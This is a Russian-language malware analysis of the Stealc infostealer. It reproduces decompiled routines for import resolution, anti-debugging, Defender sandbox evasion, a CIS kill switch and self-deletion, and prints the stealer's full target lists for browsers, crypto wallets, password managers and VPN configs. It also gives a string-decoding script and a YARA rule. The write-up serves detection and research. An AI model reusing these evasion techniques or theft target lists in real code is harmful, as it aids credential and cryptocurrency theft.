Loader : [Malware Baazare](https://bazaar.abuse.ch/sample/9d4b3b956471d7e851215b47b39e378f9ef22365de1ff9a12e4376994a4cbcc6/)

Unpacked file : [unpac.me](https://www.unpac.me/results/6f7115ff-bba6-4576-9306-1e20172eaf32?hash=3dfbec388b15267cbed80e5287f674b5047bd57c74e292beae4ccf8905441a51#/)

# Introduction

Stealc infostealer появившийся в начале 2023 года. Многие из фич были полностью украдены со стиллеров Vidar, Raccon2. Но в стиллере присутствуют и свои фишки.

# Imports

Когда я открыл бинарник в иде, на удивление обнаружил малое количество статических импортов.

![Small Imports Count](assets/Imports%201.png)

Чтобы получить адрес kernel32 он лезет в PEB и ищет модуль там (конструкция обусловлена порядком загрузки модулей при создании процесса в Windows)

```cpp
struct _LIST_ENTRY *get_kernel_from_peb()
{
  return NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink->Flink->Flink[3].Flink;
}
```

Далее он ищет в таблице экспорта нужную ему функцию, в данном случае это GetProcAddress

```cpp
int __cdecl restore_import(__IMAGE_DOS_HEADER *bin, _BYTE *func_name)
{
  unsigned int i; // [esp+0h] [ebp-1Ch]
  char *v4; // [esp+4h] [ebp-18h]
  char *v5; // [esp+8h] [ebp-14h]
  _IMAGE_NT_HEADERS *NtHeader; // [esp+Ch] [ebp-10h]
  _DWORD *v7; // [esp+14h] [ebp-8h]
  char *v8; // [esp+18h] [ebp-4h]

  if ( !bin )
    return 0;
  if ( bin->e_magic != 'ZM' )                   // MZ
    return 0;
  NtHeader = (_IMAGE_NT_HEADERS *)((char *)bin + bin->e_Ilfanew);
  if ( NtHeader->Signature != 'EP' )
    return 0;
  v7 = (_DWORD *)((char *)&bin->e_magic + NtHeader->OptionalHeader.DataDirectory[0].VirtualAddress);
  v4 = (char *)bin + v7[7];
  v5 = (char *)bin + v7[9];
  v8 = (char *)bin + v7[8];
  for ( i = 0; i < v7[6]; ++i )
  {
    if ( !strcmp((_BYTE *)bin + *(_DWORD *)&v8[4 * i], func_name) )// cmp function name
      return (int)bin + *(_DWORD *)&v4[4 * *(unsigned __int16 *)&v5[2 * i]];
  }
  return 0;
}
```
После получения адреса GetProcAddress происходит получение всех необходимых для работы адресов функций.

# Strings encryption

В качестве алгоритма шифрования строк выступает простенький Base64. Алгоритм расшифровки написан полностью нативно.

```python
import base64
import binary2strings as b2s
В
domain = ""
php_gate = ""

with open("3dfbec388b15267cbed80e5287f674b5047bd57c74e292beae4ccf8905441a51", "rb") as i:
    data = i.read()
    for (string, type, span, is_interesting) in b2s.extract_all_strings(data):
            try:
                decrypted_string = base64.urlsafe_b64decode(string)
                print("[+] ", decrypted_string,string)
                if str(decrypted_string).__contains__("b'http://") or str(decrypted_string).__contains__("b'https://"):
                    domain=decrypted_string
                if str(decrypted_string).__contains__(".php'"):
                     php_gate = decrypted_string
            except:
               continue


print(f"\n\n\n\n[+] Domain : {domain}")
print(f"[+] C2 ip : {domain+php_gate}")
```

Я написал простенький скрипт на python, который расшифровывает все строки, и извлекает ip c2 панели.

# Anti debug

Простенькая anti дебаг система, проверяет флаги, которые устанавливает дебагер при присоединении к процессу. Включаем ScyllaHide и можем без особых проблем дебажить бинарь дальше.

```cpp
int debugger_check()
{
  return LOBYTE(NtCurrentPeb()->NtGlobalFlag);
}

if ( debugger_check() )                       // NtGlobalFlags antidebug
    ExitProcess(0);
```

# Windows Defender sandbox evasion

У Windows Defender есть своя виртуальная машина, на которой он запускает файлы скачанные из интернета, или распакованные из архивов. Дальнейший набор функций помогает обнаружить, что малварь выполняется не на реальном пк и завершить выполнение. 

```cpp
int mlw_anti_windows_sandbox_by_screen_size()
{
  int result; // eax
  HDC hdc; // [esp+0h] [ebp-Ch]
  int DeviceCaps; // [esp+4h] [ebp-8h]

  hdc = CreateDCA(DISPLAY, 0, 0, 0);
  DeviceCaps = GetDeviceCaps(hdc, 10);
  result = ReleaseDC(0, hdc);
  if ( DeviceCaps < 666 )
    ExitProcess(0);
  return result;
}
void mlw_anti_windows_sandbox_by_processors_count()
{
  struct _SYSTEM_INFO SystemInfo; // [esp+4h] [ebp-24h] BYREF

  GetSystemInfo(&SystemInfo);
  if ( SystemInfo.dwNumberOfProcessors < 2 )
    ExitProcess(0);
}
BOOL mlw_try_private_mem_region()
{
  HANDLE CurrentProcess; // eax

  CurrentProcess = GetCurrentProcess();
  if ( !VirtualAllocExNuma(CurrentProcess, 0, 0x7D0u, 0x3000u, 0x40u, 0) )
    ExitProcess(0);
  return alloc_mem_and_free();
}
int mlw_anti_windows_sandbox_by_RAM_size()
{
  __int64 v0; // rax
  __int64 v1; // rax
  struct _MEMORYSTATUSEX Buffer; // [esp+0h] [ebp-48h] BYREF
  unsigned __int64 v4; // [esp+40h] [ebp-8h]

  sub_411400(&Buffer, 0, 64);
  Buffer.dwLength = 64;
  LODWORD(v0) = GlobalMemoryStatusEx(&Buffer);
  if ( (_DWORD)v0 == 1 )
  {
    v1 = sub_4133A0(Buffer.ullTotalPhys, HIDWORD(Buffer.ullTotalPhys), 1024, 0);
    v0 = sub_4133A0(v1, HIDWORD(v1), 1024, 0);
    v4 = v0;
  }
  else
  {
    v4 = 0i64;
  }
  if ( v4 < 0x457 )
    ExitProcess(0);
  return v0;
}
int mlw_check_windows_sandbox_name()
{
  LPSTR computername; // eax
  int result; // eax
  CHAR *username; // eax
  CHAR *v3; // [esp-4h] [ebp-4h]
  _BYTE *v4; // [esp-4h] [ebp-4h]

  v3 = (CHAR *)HAL9TH;
  computername = mlw_get_computername();
  result = strcmp(computername, v3);
  if ( !result )
  {
    v4 = (_BYTE *)JohnDoe;
    username = mlw_get_username();
    result = strcmp(username, v4);
    if ( !result )
      ExitProcess(0);
  }
  return result;
}
```
Больше об этом можно почитать [здесь](https://book.hacktricks.xyz/windows-hardening/av-bypass)

# Anti Cis

Не дает запуститься стиллеру на пк жителей стран бывшего снг.

```cpp
int mlw_anti_cis()
{
  int lang; // eax

  lang = GetUserDefaultLangID();
  switch ( (__int16)lang )
  {
    case 1049:                                  // Russia
      ExitProcess(0);
    case 1058:                                  // Ukrainian (Ukraine)
      ExitProcess(0);
    case 1059:                                  // Belarusian (Belarus)
      ExitProcess(0);
    case 1087:                                  // Kazakh (Kazakhstan)
      ExitProcess(0);
    case 1091:                                  // Uzbek (Latin, Uzbekistan)
      ExitProcess(0);
    default:
      return lang;
  }
}
```

# Anti double run

Не дает запуститься 2 копиям стиллера одновременно, код взят со стиллера Vidar.

```cpp
while ( 1 )                                   // anti double run
{
    str_from_this_0 = (const CHAR *)get_str_from_this_0(v15);// HAL9TH_DESKTOP-CFJRVNP_debug
    hObject = OpenEventA(0x1F0003u, 0, str_from_this_0);
    if ( !hObject )
      break;
    CloseHandle(hObject);
    Sleep(0x1770u);
  }
  v6 = (const CHAR *)get_str_from_this_0(v15);
  hObject = CreateEventA(0, 0, 0, v6);
```

# Server communication

Все пакеты получаемые и отсылаемые стиллером накрыты Base64. Начинается все с получения пакета с конфигурацией, который понадобится для дальнейшей работы.

```
0b5053a8b007d6effc8bfa7c580c06066aea9c9e8b11dd48a3924ef8b43e42993ff42512|done|fsfhghsdfd.docx|1|1|1|1|1|1|1|1|
```
Далее конфиг с моими комментариями

```
0b5053a8b007d6effc8bfa7c580c06066aea9c9e8b11dd48a3924ef8b43e42993ff42512 - token
done - добавляется в последний запрос, чтобы сигнализировать серверу о завершении работы
fsfhghsdfd.docx - idk
1|1|1|1|1|1|1|1| - отвечают за сбор данных steam, discord, telegram, tox, outlook, pidgin, создание скриншота, само удаления с компьютера жертвы.
```

Все дальнейшие пакеты содержат всевозможные данные которые нужно собрать - данные браузеров и браузерных криптокошельков, десктопных криптокошельков, отдельные файлы для сбора.

Браузеры :

```
Google Chrome|\Google\Chrome\User Data|chrome|chrome.exe|Google Chrome Canary|\Google\Chrome SxS\User Data|chrome|chrome.exe|Chromium|\Chromium\User Data|chrome|chrome.exe|Amigo|\Amigo\User Data|chrome|0|Torch|\Torch\User Data|chrome|0|Vivaldi|\Vivaldi\User Data|chrome|vivaldi.exe|Comodo Dragon|\Comodo\Dragon\User Data|chrome|0|EpicPrivacyBrowser|\Epic Privacy Browser\User Data|chrome|0|CocCoc|\CocCoc\Browser\User Data|chrome|0|Brave|\BraveSoftware\Brave-Browser\User Data|chrome|brave.exe|Cent Browser|\CentBrowser\User Data|chrome|0|7Star|\7Star\7Star\User Data|chrome|0|Chedot Browser|\Chedot\User Data|chrome|0|Microsoft Edge|\Microsoft\Edge\User Data|chrome|msedge.exe|Microsoft Edge Canary|\Microsoft\Edge SxS\User Data|chrome|msedge.exe|Microsoft Edge Beta|\Microsoft\Edge Beta\User Data|chrome|msedge.exe|Microsoft Edge Dev|\Microsoft\Edge Dev\User Data|chrome|msedge.exe|360 Browser|\360Browser\Browser\User Data|chrome|0|QQBrowser|\Tencent\QQBrowser\User Data|chrome|0|CryptoTab|\CryptoTab Browser\User Data|chrome|browser.exe|Opera Stable|\Opera Software|opera|opera.exe|Opera GX Stable|\Opera Software|opera|opera.exe|Mozilla Firefox|\Mozilla\Firefox\Profiles|firefox|0|Pale Moon|\Moonchild Productions\Pale Moon\Profiles|firefox|0|Opera Crypto Stable|\Opera Software|opera|opera.exe|Thunderbird|\Thunderbird\Profiles|firefox|0|
```

Браузерные криптокошельки : 

```
MetaMask|djclckkglechooblngghdinmeemkbgci|1|0|0|MetaMask|ejbalbakoplchlghecdalmeeeajnimhm|1|0|0|MetaMask|nkbihfbeogaeaoehlefnkodbefgpgknn|1|0|0|TronLink|ibnejdfjmmkpcnlpebklmnkoeoihofec|1|0|0|Binance Wallet|fhbohimaelbohpjbbldcngcnapndodjp|1|0|0|Yoroi|ffnbelfdoeiohenkjibnmadjiehjhajb|1|0|0|Coinbase Wallet extension|hnfanknocfeofbddgcijnmhnfnkdnaad|1|0|1|Guarda|hpglfhgfnhbgpjdenjgmdgoeiappafln|1|0|0|Jaxx Liberty|cjelfplplebdjjenllpjcblmjkfcffne|1|0|0|iWallet|kncchdigobghenbbaddojjnnaogfppfj|1|0|0|MEW CX|nlbmnnijcnlegkjjpcfjclmcfggfefdm|1|0|0|GuildWallet|nanjmdknhkinifnkgdcggcfnhdaammmj|1|0|0|Ronin Wallet|fnjhmkhhmkbjkkabndcnnogagogbneec|1|0|0|NeoLine|cphhlgmgameodnhkjdmkpanlelnlohao|1|0|0|CLV Wallet|nhnkbkgjikgcigadomkphalanndcapjk|1|0|0|Liquality Wallet|kpfopkelmapcoipemfendmdcghnegimn|1|0|0|Terra Station Wallet|aiifbnbfobpmeekipheeijimdpnlpgpp|1|0|0|Keplr|dmkamcknogkgcdfhhbddcghachkejeap|1|0|0|Sollet|fhmfendgdocmcbmfikdcogofphimnkno|1|0|0|Auro Wallet(Mina Protocol)|cnmamaachppnkjgnildpdmkaakejnhae|1|0|0|Polymesh Wallet|jojhfeoedkpkglbfimdfabpdfjaoolaf|1|0|0|ICONex|flpiciilemghbmfalicajoolhkkenfel|1|0|0|Coin98 Wallet|aeachknmefphepccionboohckonoeemg|1|0|0|EVER Wallet|cgeeodpfagjceefieflmdfphplkenlfk|1|0|0|KardiaChain Wallet|pdadjkfkgcafgbceimcpbkalnfnepbnk|1|0|0|Rabby|acmacodkjbdgmoleebolmdjonilkdbch|1|0|0|Phantom|bfnaelmomeimhlpmgjnjophhpkkoljpa|1|0|0|Brave Wallet|odbfpeeihdkbihmopkbjmoonfanlbfcl|1|0|0|Oxygen|fhilaheimglignddkjgofkcbgekhenbh|1|0|0|Pali Wallet|mgffkfbidihjpoaomajlbgchddlicgpn|1|0|0|BOLT X|aodkkagnadcbobfpggfnjeongemjbjca|1|0|0|XDEFI Wallet|hmeobnfnfcmdkdcmlblgagmfpfboieaf|1|0|0|Nami|lpfcbjknijpeeillifnkikgncikgfhdo|1|0|0|Maiar DeFi Wallet|dngmlblcodfobpdpecaadgfbcggfjfnm|1|0|0|Keeper Wallet|lpilbniiabackdjcionkobglmddfbcjo|1|0|0|Solflare Wallet|bhhhlbepdkbapadjdnnojkbgioiodbic|1|0|0|Cyano Wallet|dkdedlpgdmmkkfjabffeganieamfklkm|1|0|0|KHC|hcflpincpppdclinealmandijcmnkbgn|1|0|0|TezBox|mnfifefkajgofkcjkemidiaecocnkjeh|1|0|0|Temple|ookjlbkiijinhpmnjffcofjonbfbgaoc|1|0|0|Goby|jnkelfanjkeadonecabehalmbgpfodjm|1|0|0|Ronin Wallet|kjmoohlgokccodicjjfebfomlbljgfhk|1|0|0|Byone|nlgbhdfgdhgbiamfdfmbikcdghidoadd|1|0|0|OneKey|jnmbobjmhlngoefaiojfljckilhhlhcj|1|0|0|DAppPlay|lodccjjbdhfakaekdiahmedfbieldgik|1|0|0|SteemKeychain|jhgnbkkipaallpehbohjmkbjofjdmeid|1|0|0|Braavos Wallet|jnlgamecbpmbajjfhmmmlhejkemejdma|1|0|0|Enkrypt|kkpllkodjeloidieedojogacfhpaihoh|1|1|1|OKX Wallet|mcohilncbfahbmgdjkbpemcciiolgcge|1|0|0|Sender Wallet|epapihdplajcdnnkdeiahlgigofloibg|1|0|0|Hashpack|gjagmgiddbbciopjhllkdnddhcglnemk|1|0|0|Eternl|kmhcihpebfmpgmihbkipmjlmmioameka|1|0|0|Pontem Aptos Wallet|phkbamefinggmakgklpkljjmgibohnba|1|0|0|Petra Aptos Wallet|ejjladinnckdgjemekebdpeokbikhfci|1|0|0|Martian Aptos Wallet|efbglgofoippbgcjepnhiblaibcnclgk|1|0|0|Finnie|cjmkndjhnagcfbpiemnkdpomccnjblmj|1|0|0|Leap Terra Wallet|aijcbedoijmgnlmjeegjaglmepbmpkpi|1|0|0|Trezor Password Manager|imloifkgjagghnncjkhggdhalmcnfklk|1|0|0|Authenticator|bhghoamapcdpbohphigoooaddinpkbai|1|0|0|Authy|gaedmjdfmmahhbjefcbgaolhhanlaolb|1|0|0|EOS Authenticator|oeljdldpnmdbchonielidgobddffflal|1|0|0|GAuth Authenticator|ilgcnhelpchnceeipipijaljkblbcobl|1|0|0|Bitwarden|nngceckbapebfimnlniiiahkandclblb|1|0|0|KeePassXC|oboonakemofpalcgghocfoadofidjkkk|1|0|0|Dashlane|fdjamakpfbbddfjaooikfcpapjohcfmg|1|0|0|NordPass|fooolghllnmhmmndgjiamiiodkpenpbb|1|0|0|Keeper|bfogiafebfohielmmehodmfbbebbbpei|1|0|0|RoboForm|pnlccmojcmeohlpggmfnbbiapkmbliob|1|0|0|LastPass|hdokiejnpimakedhajhdlcegeplioahd|1|0|0|BrowserPass|naepdomgkenhinolocfifgehidddafch|1|0|0|MYKI|bmikpgodpkclnkgmnpphehdgcimmided|1|0|0|Splikity|jhfjfclepacoldmjmkmdlmganfaalklb|1|0|0|CommonKey|chgfefjpcobfbnpmiokfjjaglahmnded|1|0|0|Zoho Vault|igkpcodhieompeloncfnbekccinhapdb|1|0|0|Opera Wallet|gojhcdgcpbpfigcaejpfhfegekdgiblk|0|0|1|Enpass|kmcfomidfpdkfieipokbalgegidffkal|1|0|0|
```

Десктопные криптокошельки : 

```
Bitcoin Core|\Bitcoin\wallets\|wallet.dat|1|Bitcoin Core Old|\Bitcoin\|*wallet*.dat|0|Dogecoin|\Dogecoin\|*wallet*.dat|0|Raven Core|\Raven\|*wallet*.dat|0|Daedalus Mainnet|\Daedalus Mainnet\wallets\|she*.sqlite|0|Blockstream Green|\Blockstream\Green\wallets\|*.*|1|Wasabi Wallet|\WalletWasabi\Client\Wallets\|*.json|0|Ethereum|\Ethereum\|keystore|0|Electrum|\Electrum\wallets\|*.*|0|ElectrumLTC|\Electrum-LTC\wallets\|*.*|0|Exodus|\Exodus\|exodus.conf.json|0|Exodus|\Exodus\|window-state.json|0|Exodus|\Exodus\exodus.wallet\|passphrase.json|0|Exodus|\Exodus\exodus.wallet\|seed.seco|0|Exodus|\Exodus\exodus.wallet\|info.seco|0|Electron Cash|\ElectronCash\wallets\|*.*|0|MultiDoge|\MultiDoge\|multidoge.wallet|0|Jaxx Desktop (old)|\jaxx\Local Storage\|file__0.localstorage|0|Jaxx Desktop|\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb\|*.*|0|Atomic|\atomic\Local Storage\leveldb\|*.*|0|Binance|\Binance\|app-store.json|0|Binance|\Binance\|simple-storage.json|0|Binance|\Binance\|.finger-print.fp|0|Coinomi|\Coinomi\Coinomi\wallets\|*.wallet|1|Coinomi|\Coinomi\Coinomi\wallets\|*.config|1|Ledger Live|\Ledger Live\Local Storage\leveldb\|*.*|0|Ledger Live|\Ledger Live\Session Storage\|*.*|0|
```

Настройки файлграббера : 

```
RECENT|%RECENT%\|*.txt,*.docx,*.xlsx|5|1|1|RECENT|%RECENT%\|*exodus*.png,*exodus*.pdf,*wallet*.png,*wallet*.pdf,*backup*.png,*backup*.pdf,*recover*.png,*recover*.pdf,*metamask*.*,*UTC--*.*|1500|1|1|DESK|%DESKTOP%\|*exodus*.png,*exodus*.pdf,*wallet*.png,*wallet*.pdf,*backup*.png,*backup*.pdf,*recover*.png,*recover*.pdf,*metamask*.*,*UTC--*.*|1500|1|1|DOCS|%DOCUMENTS%\|*exodus*.png,*exodus*.pdf,*wallet*.png,*wallet*.pdf,*backup*.png,*backup*.pdf,*recover*.png,*recover*.pdf,*metamask*.*,*UTC--*.*|1500|1|1|DOCS|%DOCUMENTS%\|*.txt,*.docx,*.xlsx|8|1|1|DESK|%DESKTOP%\|*.txt,*.docx,*.xlsx|8|1|1|NOTEPAD|%APPDATA%\Notepad++|*.xml|10|1|1|NOTEPAD|%APPDATA%\Notepad++\backup\|*.*|10|1|1|SUBLIME|%APPDATA%\Sublime Text 3\Local\Session.sublime_session\|*.sublime_*|10|1|1|VPN_CiscoVPN|%PROGRAMFILES%\\..\\ProgramData\\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\|*.xml|999|1|0|VPN_Fortinet|%PROGRAMFILES%\Fortinet\FortiClient\|*.conf,*.xml|999|1|0|VPN_SonicWall|%APPDATA%\SonicWall\Global VPN Client\|*.rcf|999|1|0|VPN_F5|%PROGRAMFILES%\F5 VPN\|*.xml,*.ini|999|1|0|VPN_F5|%PROGRAMFILES_86%\F5 VPN\|*.xml,*.ini|999|1|0|VPN_Pulse|%PROGRAMFILES%\\..\\ProgramData\\Pulse Secure\VPN Client\config\|*.xml,*.conf|999|1|0|VPN_CheckPoint|%PROGRAMFILES_86%\CheckPoint\Endpoint Connect\|trac.config|999|1|0|VPN_CheckPoint|%APPDATA%\CheckPoint\Endpoint Security VPN\|*.xml,*.ini|999|1|0|VPN_OpenVPN|%PROGRAMFILES%\OpenVPN\config\|*.ovpn, *.conf|999|1|0|VPN_OpenVPN|%PROGRAMFILES_86%\OpenVPN\config\|*.ovpn, *.conf|999|1|0|VPN_OpenVPN|%USERPROFILE%\OpenVPN\config\|*.ovpn, *.conf|999|1|0|RemoteNG|%APPDATA%\mRemoteNG\|*.xml|999|1|0|
```

# Self delete

Удаляет себя после работы через cmd и простенькую команду с делеем.

```cpp
void __noreturn mlw_self_delete()
{
  LPCSTR *v0; // eax
  LPCSTR *v1; // eax
  int v2[3]; // [esp+0h] [ebp-44Ch] BYREF
  int v3[3]; // [esp+Ch] [ebp-440h] BYREF
  void *v4[3]; // [esp+18h] [ebp-434h] BYREF
  CHAR Filename[1004]; // [esp+24h] [ebp-428h] BYREF
  SHELLEXECUTEINFOA pExecInfo; // [esp+410h] [ebp-3Ch] BYREF

  sub_4113E0(Filename, 0x3E8u);
  sub_4113E0(&pExecInfo, 0x3Cu);
  GetModuleFileNameA(0, Filename, 0x104u);
  lstcpy((LPSTR *)v4, (CHAR *)sSelfDelete);
  v0 = (LPCSTR *)lstrcat((int)v4, (int)v3, Filename);
  lstrcpy((int *)v4, v0);
  get_str_from_this(v3);
  v1 = (LPCSTR *)lstrcat((int)v4, (int)v2, sSelfDelete_0);// /c timeout /t 5 & del /f /q "
                                                // " & del "C:\ProgramData\*.dll"" & exit
  lstrcpy((int *)v4, v1);
  get_str_from_this(v2);
  pExecInfo.cbSize = 60;
  pExecInfo.fMask = 0;
  pExecInfo.hwnd = 0;
  pExecInfo.lpVerb = (LPCSTR)sOpen;
  pExecInfo.lpFile = (LPCSTR)sCmdExe;
  pExecInfo.lpParameters = (LPCSTR)get_str_from_this_0(v4);
  memset(&pExecInfo.lpDirectory, 0, 12);
  ShellExecuteExA(&pExecInfo);
  sub_4113E0(&pExecInfo, 0x3Cu);
  sub_4113E0(Filename, 0x3E8u);
  sub_4132F0((int *)v4);
  ExitProcess(0);
}
```

# Yara

```
rule Stealc_stealer_detect
{
	meta:
		description = "Detect stealc stealer"
		author = "ch4daev"
		date = "2023-11-29"
	strings:
		$content_type = "Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0t"
		$content_disp = "Q29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSI="
		$detect_cis ={
			55
			8B EC
			51
			FF 15 ?? ?? ?? ??
			0F B7 C0
			89 45 ??
			8B 4D ??
			81 E9 ?? ?? ?? ??
			89 4D ??
			83 7D ?? ??
			77 ??
			8B 55 ??
			0F B6 82 ?? ?? ?? ??
			FF 24 85 ?? ?? ?? ??
		}
	condition:
		$content_type and $content_disp and $detect_cis

}
```



